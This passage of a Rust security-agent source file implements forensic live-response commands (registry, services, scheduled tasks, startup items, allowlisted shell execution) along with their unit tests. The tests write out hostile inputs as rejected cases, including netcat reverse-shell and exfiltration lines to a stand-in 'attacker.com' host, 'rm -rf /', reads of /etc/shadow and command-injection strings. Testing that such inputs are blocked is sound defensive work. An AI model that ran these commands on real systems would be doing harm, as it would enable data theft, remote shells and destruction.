    }

    #[cfg(target_os = "linux")]
    {
        // Linux doesn't have a standard DNS cache command
        // Could check systemd-resolve --statistics or nscd cache
        entries.push(serde_json::json!({
            "note": "Linux DNS cache inspection requires systemd-resolved or nscd"
        }));
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "entries": entries,
            "count": entries.len()
        })),
    }
}

fn parse_macos_scutil_dns(output: &str) -> Vec<serde_json::Value> {
    let mut entries = Vec::new();
    let mut resolver = serde_json::Map::new();
    let mut nameservers = Vec::new();
    let mut search_domains = Vec::new();

    for raw_line in output.lines() {
        let line = raw_line.trim();

        if line.starts_with("resolver #") {
            flush_macos_dns_resolver(
                &mut entries,
                &mut resolver,
                &mut nameservers,
                &mut search_domains,
            );
            resolver.insert(
                "resolver".to_string(),
                serde_json::json!(line.trim_end_matches(':')),
            );
            resolver.insert("source".to_string(), serde_json::json!("scutil --dns"));
            resolver.insert("type".to_string(), serde_json::json!("resolver_snapshot"));
            continue;
        }

        let Some((key, value)) = line.split_once(':') else {
            continue;
        };
        let key = key.trim();
        let value = value.trim();

        if key.starts_with("nameserver[") {
            if !value.is_empty() {
                nameservers.push(serde_json::json!(value));
            }
        } else if key.starts_with("search domain[") {
            if !value.is_empty() {
                search_domains.push(serde_json::json!(value));
            }
        } else if matches!(key, "domain" | "search domain" | "interface" | "flags") {
            resolver.insert(key.replace(' ', "_"), serde_json::json!(value));
        } else if key == "reach" || key == "order" {
            if let Some(number) = parse_macos_scutil_number(value) {
                resolver.insert(key.to_string(), serde_json::json!(number));
            }
        }
    }

    flush_macos_dns_resolver(
        &mut entries,
        &mut resolver,
        &mut nameservers,
        &mut search_domains,
    );

    entries
}

fn parse_macos_scutil_number(value: &str) -> Option<u32> {
    let token = value.split_whitespace().next().unwrap_or("");
    if let Some(hex) = token.strip_prefix("0x") {
        u32::from_str_radix(hex, 16).ok()
    } else {
        token.parse::<u32>().ok()
    }
}

fn flush_macos_dns_resolver(
    entries: &mut Vec<serde_json::Value>,
    resolver: &mut serde_json::Map<String, serde_json::Value>,
    nameservers: &mut Vec<serde_json::Value>,
    search_domains: &mut Vec<serde_json::Value>,
) {
    if resolver.is_empty() {
        return;
    }

    if !nameservers.is_empty() {
        resolver.insert(
            "nameservers".to_string(),
            serde_json::Value::Array(std::mem::take(nameservers)),
        );
    }
    if !search_domains.is_empty() {
        resolver.insert(
            "search_domains".to_string(),
            serde_json::Value::Array(std::mem::take(search_domains)),
        );
    }

    entries.push(serde_json::Value::Object(std::mem::take(resolver)));
}

/// Query Windows registry
pub async fn live_response_registry_query(payload: &serde_json::Value) -> CommandResult {
    let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
    let recursive = payload
        .get("recursive")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if key.is_empty() {
        return CommandResult {
            success: false,
            error_message: Some("Registry key is required".to_string()),
            result_data: None,
        };
    }

    info!(
        key = key,
        recursive = recursive,
        "Live response: querying registry"
    );

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let mut args = vec!["query", key];
        if recursive {
            args.push("/s");
        }

        let output = Command::new("reg").args(&args).output();

        match output {
            Ok(out) if out.status.success() => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let mut values = Vec::new();
                let mut subkeys = Vec::new();

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.starts_with("HKEY_") {
                        subkeys.push(line.to_string());
                    } else if !line.is_empty() && line.contains("    ") {
                        let parts: Vec<&str> = line.splitn(3, "    ").collect();
                        if parts.len() >= 3 {
                            values.push(serde_json::json!({
                                "name": parts[0].trim(),
                                "type": parts[1].trim(),
                                "data": parts[2].trim()
                            }));
                        }
                    }
                }

                CommandResult {
                    success: true,
                    error_message: None,
                    result_data: Some(serde_json::json!({
                        "key": key,
                        "values": values,
                        "subkeys": subkeys
                    })),
                }
            }
            Ok(out) => CommandResult {
                success: false,
                error_message: Some(format!(
                    "Registry query failed: {}",
                    String::from_utf8_lossy(&out.stderr)
                )),
                result_data: None,
            },
            Err(e) => CommandResult {
                success: false,
                error_message: Some(format!("Failed to execute reg command: {}", e)),
                result_data: None,
            },
        }
    }

    #[cfg(not(target_os = "windows"))]
    CommandResult {
        success: false,
        error_message: Some("Registry operations only available on Windows".to_string()),
        result_data: None,
    }
}

/// List services
pub async fn live_response_service_list(payload: &serde_json::Value) -> CommandResult {
    let filter = payload.get("filter").and_then(|v| v.as_str());
    let state = payload.get("state").and_then(|v| v.as_str());

    info!("Live response: listing services");

    let mut services: Vec<serde_json::Value> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let output = Command::new("sc").args(["query", "state=", "all"]).output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let mut current_service = serde_json::Map::new();

            for line in stdout.lines() {
                let line = line.trim();
                if line.starts_with("SERVICE_NAME:") {
                    if !current_service.is_empty() {
                        let svc = serde_json::Value::Object(current_service.clone());

                        // Apply filters
                        let name = svc.get("name").and_then(|n| n.as_str()).unwrap_or("");
                        let svc_state = svc.get("state").and_then(|s| s.as_str()).unwrap_or("");

                        let pass_filter = filter
                            .map(|f| name.to_lowercase().contains(&f.to_lowercase()))
                            .unwrap_or(true);
                        let pass_state = state
                            .map(|s| svc_state.to_lowercase().contains(&s.to_lowercase()))
                            .unwrap_or(true);

                        if pass_filter && pass_state {
                            services.push(svc);
                        }
                        current_service.clear();
                    }
                    if let Some((_, name)) = line.split_once(':') {
                        current_service.insert("name".to_string(), serde_json::json!(name.trim()));
                    }
                } else if line.starts_with("DISPLAY_NAME:") {
                    if let Some((_, name)) = line.split_once(':') {
                        current_service
                            .insert("display_name".to_string(), serde_json::json!(name.trim()));
                    }
                } else if line.starts_with("STATE") {
                    if let Some((_, state_val)) = line.split_once(':') {
                        current_service
                            .insert("state".to_string(), serde_json::json!(state_val.trim()));
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        use std::process::Command;

        let output = Command::new("systemctl")
            .args(["list-units", "--type=service", "--all", "--no-pager"])
            .output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            for line in stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 4 {
                    let name = parts[0].trim_end_matches(".service");
                    let svc_state = parts[2];

                    // Apply filters
                    let pass_filter = filter
                        .map(|f| name.to_lowercase().contains(&f.to_lowercase()))
                        .unwrap_or(true);
                    let pass_state = state
                        .map(|s| svc_state.to_lowercase().contains(&s.to_lowercase()))
                        .unwrap_or(true);

                    if pass_filter && pass_state {
                        services.push(serde_json::json!({
                            "name": name,
                            "load": parts[1],
                            "active": parts[2],
                            "sub": parts[3],
                            "description": parts.get(4..).map(|p| p.join(" ")).unwrap_or_default()
                        }));
                    }
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        use std::process::Command;

        if let Ok(out) = Command::new("launchctl").args(["list"]).output() {
            if out.status.success() {
                services.extend(
                    parse_macos_launchctl_list(&String::from_utf8_lossy(&out.stdout))
                        .into_iter()
                        .filter(|service| service_matches_filters(service, filter, state)),
                );
            } else {
                warn!(
                    status = ?out.status.code(),
                    stderr = %String::from_utf8_lossy(&out.stderr).trim(),
                    "Live response launchctl list failed on macOS"
                );
            }
        }
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "services": services,
            "count": services.len()
        })),
    }
}

fn service_matches_filters(
    service: &serde_json::Value,
    filter: Option<&str>,
    state: Option<&str>,
) -> bool {
    let name = service
        .get("name")
        .or_else(|| service.get("label"))
        .and_then(|value| value.as_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let service_state = service
        .get("state")
        .and_then(|value| value.as_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    filter
        .map(|value| name.contains(&value.to_ascii_lowercase()))
        .unwrap_or(true)
        && state
            .map(|value| service_state.contains(&value.to_ascii_lowercase()))
            .unwrap_or(true)
}

fn parse_macos_launchctl_list(output: &str) -> Vec<serde_json::Value> {
    output
        .lines()
        .filter_map(parse_macos_launchctl_list_line)
        .collect()
}

fn parse_macos_launchctl_list_line(line: &str) -> Option<serde_json::Value> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() < 3 || parts[0] == "PID" {
        return None;
    }

    let pid = if parts[0] == "-" {
        None
    } else {
        parts[0].parse::<u32>().ok()
    };
    let status = parts[1].parse::<i32>().unwrap_or_default();
    let label = parts[2..].join(" ");
    if label.is_empty() {
        return None;
    }

    Some(serde_json::json!({
        "name": label,
        "label": label,
        "pid": pid,
        "status": status,
        "state": if pid.is_some() { "running" } else { "stopped" },
        "manager": "launchd"
    }))
}

/// List scheduled tasks
pub async fn live_response_scheduled_tasks(_payload: &serde_json::Value) -> CommandResult {
    info!("Live response: listing scheduled tasks");

    let mut tasks: Vec<serde_json::Value> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        let output = Command::new("schtasks")
            .args(["/Query", "/FO", "CSV", "/V"])
            .output();

        if let Ok(out) = output {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let mut lines = stdout.lines();

            // Get headers
            if let Some(header_line) = lines.next() {
                let headers: Vec<&str> = header_line
                    .split(',')
                    .map(|h| h.trim_matches('"'))
                    .collect();

                for line in lines {
                    let values: Vec<&str> = line.split(',').map(|v| v.trim_matches('"')).collect();

                    if values.len() >= headers.len() {
                        let mut task = serde_json::Map::new();
                        for (i, header) in headers.iter().enumerate() {
                            if let Some(value) = values.get(i) {
                                task.insert(
                                    header.to_lowercase().replace(' ', "_"),
                                    serde_json::json!(value),
                                );
                            }
                        }
                        tasks.push(serde_json::Value::Object(task));
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        // Read crontabs
        if let Ok(content) = std::fs::read_to_string("/etc/crontab") {
            tasks.push(serde_json::json!({
                "type": "system_crontab",
                "path": "/etc/crontab",
                "content": content
            }));
        }

        // Read user crontab
        use std::process::Command;
        if let Ok(out) = Command::new("crontab").args(["-l"]).output() {
            if out.status.success() {
                tasks.push(serde_json::json!({
                    "type": "user_crontab",
                    "content": String::from_utf8_lossy(&out.stdout).to_string()
                }));
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        tasks.extend(enumerate_macos_launchd_plists());
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "tasks": tasks,
            "count": tasks.len()
        })),
    }
}

/// List startup items
pub async fn live_response_startup_items(_payload: &serde_json::Value) -> CommandResult {
    info!("Live response: listing startup items");

    let mut items: Vec<serde_json::Value> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        use std::process::Command;

        // Registry run keys
        let run_keys = [
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        ];

        for key in run_keys {
            if let Ok(output) = Command::new("reg").args(["query", key]).output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines() {
                    let line = line.trim();
                    if !line.is_empty() && !line.starts_with("HKEY_") {
                        let parts: Vec<&str> = line.splitn(3, "    ").collect();
                        if parts.len() >= 3 {
                            items.push(serde_json::json!({
                                "type": "registry",
                                "location": key,
                                "name": parts[0].trim(),
                                "value_type": parts[1].trim(),
                                "value": parts[2].trim()
                            }));
                        }
                    }
                }
            }
        }

        // Startup folders
        if let Ok(appdata) = std::env::var("APPDATA") {
            let user_startup =
                format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", appdata);
            if let Ok(entries) = std::fs::read_dir(&user_startup) {
                for entry in entries.flatten() {
                    items.push(serde_json::json!({
                        "type": "startup_folder",
                        "location": "user",
                        "path": entry.path().to_string_lossy()
                    }));
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        let locations = [
            "/etc/rc.local",
            "/etc/init.d",
            "/etc/systemd/system",
            "/lib/systemd/system",
        ];

        for loc in locations {
            if std::path::Path::new(loc).exists() {
                if std::fs::metadata(loc).map(|m| m.is_dir()).unwrap_or(false) {
                    if let Ok(entries) = std::fs::read_dir(loc) {
                        for entry in entries.flatten() {
                            items.push(serde_json::json!({
                                "type": "startup",
                                "location": loc,
                                "path": entry.path().to_string_lossy()
                            }));
                        }
                    }
                } else {
                    items.push(serde_json::json!({
                        "type": "startup_script",
                        "path": loc
                    }));
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        items.extend(
            enumerate_macos_launchd_plists()
                .into_iter()
                .map(|mut item| {
                    if let Some(object) = item.as_object_mut() {
                        let kind = object
                            .get("kind")
                            .and_then(|value| value.as_str())
                            .unwrap_or("launchd");
                        object.insert("type".to_string(), serde_json::json!(kind));
                    }
                    item
                }),
        );
    }

    CommandResult {
        success: true,
        error_message: None,
        result_data: Some(serde_json::json!({
            "items": items,
            "count": items.len()
        })),
    }
}

fn enumerate_macos_launchd_plists() -> Vec<serde_json::Value> {
    let mut items = Vec::new();

    for (kind, location) in macos_launchd_locations() {
        let Ok(entries) = std::fs::read_dir(&location) else {
            continue;
        };

        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|ext| ext.to_str()) != Some("plist") {
                continue;
            }

            let label = path
                .file_stem()
                .and_then(|name| name.to_str())
                .unwrap_or_default()
                .to_string();

            items.push(serde_json::json!({
                "type": "launchd_plist",
                "kind": kind,
                "label": label,
                "name": label,
                "path": path.to_string_lossy(),
                "location": location,
                "manager": "launchd"
            }));
        }
    }

    items
}

fn macos_launchd_locations() -> Vec<(&'static str, String)> {
    let mut locations = vec![
        ("launch_daemon", "/Library/LaunchDaemons".to_string()),
        ("launch_agent", "/Library/LaunchAgents".to_string()),
        (
            "system_launch_daemon",
            "/System/Library/LaunchDaemons".to_string(),
        ),
        (
            "system_launch_agent",
            "/System/Library/LaunchAgents".to_string(),
        ),
    ];

    if let Ok(home) = std::env::var("HOME") {
        locations.push(("user_launch_agent", format!("{home}/Library/LaunchAgents")));
    }

    locations
}

/// Execute a shell command (restricted to allowlisted forensic commands)
pub async fn live_response_shell_execute(payload: &serde_json::Value) -> CommandResult {
    let command = payload
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("");
    let timeout_secs = payload
        .get("timeout")
        .and_then(|v| v.as_u64())
        .unwrap_or(30);

    if command.is_empty() {
        return CommandResult {
            success: false,
            error_message: Some("Command is required".to_string()),
            result_data: None,
        };
    }

    // Safety: Only allow commands on the forensic allowlist.
    if let Err(reason) = validate_command(command) {
        warn!(
            command = command,
            reason = %reason,
            "Rejected shell command: not on forensic allowlist"
        );
        return CommandResult {
            success: false,
            error_message: Some(format!("Command rejected: {}", reason)),
            result_data: None,
        };
    }

    info!(
        command = command,
        timeout = timeout_secs,
        "Live response: executing shell command"
    );

    use std::process::Command;

    #[cfg(target_os = "windows")]
    let output = Command::new("cmd").args(["/C", command]).output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").args(["-c", command]).output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_string();
            let stderr = String::from_utf8_lossy(&out.stderr).to_string();

            CommandResult {
                success: out.status.success(),
                error_message: if stderr.is_empty() {
                    None
                } else {
                    Some(stderr)
                },
                result_data: Some(serde_json::json!({
                    "stdout": stdout,
                    "exit_code": out.status.code().unwrap_or(-1)
                })),
            }
        }
        Err(e) => CommandResult {
            success: false,
            error_message: Some(format!("Failed to execute command: {}", e)),
            result_data: None,
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_command_allows_safe_commands() {
        // Basic allowed commands should pass
        assert!(validate_command("whoami").is_ok());
        assert!(validate_command("hostname").is_ok());
        assert!(validate_command("netstat -an").is_ok());
        #[cfg(target_os = "windows")]
        assert!(validate_command("tasklist").is_ok());
    }

    #[test]
    fn test_validate_command_blocks_command_chaining() {
        // Semicolon chaining
        assert!(validate_command("ls; rm -rf /").is_err());
        assert!(validate_command("whoami;cat /etc/passwd").is_err());

        // AND chaining
        assert!(validate_command("ls && rm -rf /").is_err());
        assert!(validate_command("whoami && cat /etc/shadow").is_err());

        // OR chaining
        assert!(validate_command("ls || rm -rf /").is_err());
    }

    #[test]
    fn test_validate_command_blocks_pipes() {
        // Pipe to arbitrary command
        assert!(validate_command("ps aux | nc attacker.com 4444").is_err());
        assert!(validate_command("tasklist | findstr malware").is_err());
    }

    #[test]
    fn test_validate_command_blocks_command_substitution() {
        // Backtick substitution
        assert!(validate_command("echo `whoami`").is_err());
        assert!(validate_command("ls `cat /etc/passwd`").is_err());

        // $() substitution
        assert!(validate_command("echo $(whoami)").is_err());
        assert!(validate_command("ls $(cat /etc/passwd)").is_err());
    }

    #[test]
    fn test_validate_command_blocks_redirection() {
        // Output redirection
        assert!(validate_command("echo malware > /etc/passwd").is_err());
        assert!(validate_command("whoami >> /tmp/log").is_err());

        // Input redirection
        assert!(validate_command("cat < /etc/shadow").is_err());
    }

    #[test]
    fn test_validate_command_blocks_newlines() {
        // Newline injection
        assert!(validate_command("ls\nrm -rf /").is_err());
        assert!(validate_command("whoami\r\ncat /etc/passwd").is_err());
    }

    #[test]
    fn test_validate_command_blocks_env_expansion() {
        // Environment variable expansion attacks
        assert!(validate_command("%COMSPEC% /c calc.exe").is_err());
        assert!(validate_command("$SHELL -c 'rm -rf /'").is_err());
        assert!(validate_command("echo ${PATH}").is_err());
    }

    #[test]
    fn test_validate_command_rejects_unlisted_commands() {
        // Commands not in allowlist should be rejected
        assert!(validate_command("curl http://malware.com").is_err());
        assert!(validate_command("wget http://malware.com").is_err());
        assert!(validate_command("nc -e /bin/sh attacker.com 4444").is_err());
    }

    #[test]
    fn test_validate_command_empty() {
        assert!(validate_command("").is_err());
        assert!(validate_command("   ").is_err());
    }

    #[tokio::test]
    async fn test_file_upload_create_dirs_creates_immediate_parent() {
        let dir = tempfile::tempdir().unwrap();
        let target = dir.path().join("models").join("malware_smell.onnx");
        let content = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b"onnx");

        let missing_parent_result = live_response_file_upload(&serde_json::json!({
            "path": target.to_string_lossy(),
            "content": content,
            "create_dirs": false
        }))
        .await;
        assert!(!missing_parent_result.success);

        let content = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, b"onnx");
        let create_parent_result = live_response_file_upload(&serde_json::json!({
            "path": target.to_string_lossy(),
            "content": content,
            "create_dirs": true
        }))
        .await;
        assert!(create_parent_result.success);
        assert_eq!(std::fs::read(target).unwrap(), b"onnx");
    }

    #[test]
    fn test_parse_macos_lsof_network_connections() {
        let output = "\
p123
cSafari
PTCP
n192.168.1.10:54832->142.250.190.78:443
TST=ESTABLISHED
p456
cSlack
PUDP
n192.168.1.10:53521->8.8.8.8:53
";

        let connections = parse_macos_lsof_network_connections(output);

        assert_eq!(connections.len(), 2);
        assert_eq!(connections[0]["pid"], 123);
        assert_eq!(connections[0]["process"], "Safari");
        assert_eq!(connections[0]["protocol"], "tcp");
        assert_eq!(connections[0]["remote_ip"], "142.250.190.78");
        assert_eq!(connections[0]["remote_port"], 443);
        assert_eq!(connections[0]["state"], "ESTABLISHED");
        assert_eq!(connections[1]["protocol"], "udp");
        assert_eq!(connections[1]["remote_ip"], "8.8.8.8");
        assert_eq!(connections[1]["remote_port"], 53);
    }

    #[test]
    fn test_parse_macos_netstat_network_connections() {
        let output = "\
Active Internet connections (including servers)
Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)      rhiwat  shiwat    pid   epid state  options
tcp4       0      0  192.168.12.117.56981   168.205.203.166.8443   ESTABLISHED 3428168  131072  67544      0 00182 00000000
udp6       0      0  2804:149c:2:c255.62470 2800:3f0:4001:80.443               1048576   29040   1677      0 00102 00000000
udp4       0      0  *.*                    *.*                                 786896    9216  67312      0 00000 00000000
";

        let connections = parse_macos_netstat_network_connections(output);

        assert_eq!(connections.len(), 2);
        assert_eq!(connections[0]["pid"], 67544);
        assert_eq!(connections[0]["protocol"], "tcp");
        assert_eq!(connections[0]["remote_ip"], "168.205.203.166");
        assert_eq!(connections[0]["remote_port"], 8443);
        assert_eq!(connections[0]["state"], "ESTABLISHED");
        assert_eq!(connections[1]["pid"], 1677);
        assert_eq!(connections[1]["protocol"], "udp");
        assert_eq!(connections[1]["remote_ip"], "2800:3f0:4001:80");
        assert_eq!(connections[1]["remote_port"], 443);
    }

    #[test]
    fn test_parse_macos_scutil_dns() {
        let output = "\
DNS configuration

resolver #1
  search domain[0] : corp.example
  nameserver[0] : 10.0.0.2
  nameserver[1] : 10.0.0.3
  if_index : 14 (en0)
  flags    : Request A records
  reach    : 0x00000002 (Reachable)
  order    : 200000

resolver #2
  domain   : local
  options  : mdns
  timeout  : 5
  flags    : Request A records
  order    : 300000
";

        let entries = parse_macos_scutil_dns(output);

        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0]["resolver"], "resolver #1");
        assert_eq!(entries[0]["type"], "resolver_snapshot");
        assert_eq!(entries[0]["nameservers"][0], "10.0.0.2");
        assert_eq!(entries[0]["nameservers"][1], "10.0.0.3");
        assert_eq!(entries[0]["search_domains"][0], "corp.example");
        assert_eq!(entries[0]["reach"], 2);
        assert_eq!(entries[0]["order"], 200000);
        assert_eq!(entries[1]["domain"], "local");
    }

    #[test]
    fn test_network_connection_filters_apply_to_macos_shape() {
        let connection = serde_json::json!({
            "protocol": "tcp",
            "state": "ESTABLISHED",
            "pid": 67544
        });

        assert!(network_connection_matches_filters(
            &connection,
            Some("tcp"),
            Some("estab"),
            Some(67544)
        ));
        assert!(!network_connection_matches_filters(
            &connection,
            Some("udp"),
            None,
            None
        ));
        assert!(!network_connection_matches_filters(
            &connection,
            None,
            None,
            Some(42)
        ));
    }

    #[test]
    fn test_parse_macos_launchctl_list() {
        let output = "\
PID\tStatus\tLabel
123\t0\tcom.tamandua.tamanduaagent
-\t0\tcom.apple.periodic-daily
";

        let services = parse_macos_launchctl_list(output);

        assert_eq!(services.len(), 2);
        assert_eq!(services[0]["name"], "com.tamandua.tamanduaagent");
        assert_eq!(services[0]["pid"], 123);
        assert_eq!(services[0]["state"], "running");
        assert_eq!(services[1]["name"], "com.apple.periodic-daily");
        assert!(services[1]["pid"].is_null());
        assert_eq!(services[1]["state"], "stopped");
    }

    #[test]
    fn test_service_filters_apply_to_macos_launchd_shape() {
        let service = serde_json::json!({
            "name": "com.tamandua.tamanduaagent",
            "state": "running"
        });

        assert!(service_matches_filters(
            &service,
            Some("tamandua"),
            Some("run")
        ));
        assert!(!service_matches_filters(&service, Some("apple"), None));
        assert!(!service_matches_filters(&service, None, Some("stopped")));
    }
}
